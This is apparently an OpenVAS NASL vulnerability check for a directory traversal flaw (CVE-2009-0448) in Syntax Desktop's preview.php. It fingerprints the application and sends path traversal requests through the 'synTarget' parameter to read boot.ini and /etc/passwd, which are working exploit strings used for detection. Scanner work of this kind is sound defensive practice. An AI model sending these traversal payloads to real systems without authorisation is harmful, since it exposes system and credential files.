##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_syntax_desktop_dir_trvsl_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# Syntax Desktop Directory Traversal Vulnerability
#
# Authors:
# Sujit Ghosal <sghosal@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the attacker gain sensitive information
  about the remote system directories where syntax desktop runs.

  Impact level: Application/System";

tag_affected = "Syntax Desktop 2.7 and prior";
tag_insight = "This flaw is due to error in file 'preview.php' in 'synTarget'
  parameter which lets the attacker to gain information through directoy 
  traversal queries.";
tag_solution = "No Solution or patch is available as of 17th February 2009.
  For updates refer to http://www.syntaxdesktop.com";
tag_summary = "This host is running Syntax Desktop and is prone to Directory
  Traversal Vulnerability.";

if(description)
{
  script_id(800234);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-02-20 17:40:17 +0100 (Fri, 20 Feb 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_bugtraq_id(33601);
  script_cve_id("CVE-2009-0448");
  script_name("Syntax Desktop Directory Traversal Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/7977");

  script_description(desc);
  script_summary("Check for LFI attack string on Syntax Desktop");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("http_version.nasl");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
  }
  exit(0);
}


include("version_func.inc");
include("http_func.inc");

synPort = get_kb_item("Services/www");
if(!get_port_state(synPort)){
  exit(0);
}

foreach path(make_list("/", "/admin", cgi_dirs()))
{
  request = http_get(item:"/index.php", port:synPort);
  response = http_send_recv(port:synPort, data:request);
  if(response == NULL){
    exit();
  }
  if("Syntax Desktop" >< response)
  {
    # LFI Attack request for Windows OS
    request = http_get(item:path + "/admin/modules/aa/preview.php?synTarget=" +
                          "../../../../../../../../../boot.ini", port:synPort);
    response = http_send_recv(port:synPort, data:request);
    if("boot loader" >< response)
    {
      security_hole(synPort);
      exit(0);
    }
    # LFI Attack request for Linux OS
    request2 = http_get(item:path + "/admin/modules/aa/preview.php?synTarget=" +
                        "../../../../../../../../../etc/passwd", port:synPort);
    resp = http_send_recv(port:synPort, data:request2);
    if("root" >< resp)
    {
      security_hole(synPort);
      exit(0);
    }
    exit(0);
  }
}
